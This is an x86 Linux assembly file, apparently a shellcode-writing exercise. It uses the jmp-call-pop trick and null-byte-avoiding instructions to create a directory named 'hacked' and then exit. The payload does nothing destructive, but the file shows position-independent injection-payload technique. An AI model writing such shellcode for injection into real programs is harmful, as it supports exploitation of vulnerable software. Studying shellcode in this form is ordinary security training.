section .text

global _start

_start:

jmp short call_shellcode

shellcode:

cld			; null
pop esi			; jmp call pop - "hacked"
std			; null

push 0x27		; mkdir() syscall number
pop eax			;

lea ebx, [esi]		; load addr of new dir "hacked"

;mov ebx, esi		; load addr

push 0x1ed		; dir mode 755
pop ecx

int 0x80		; run mkdir()

; exit: success = eax = 0x0

inc eax		; exit() syscall number 0x1
xor ebx, ebx
int 0x80	; run exit()

call_shellcode:

call shellcode

hacked: db 0x68,0x61,0x63,0x6B,0x65,0x64
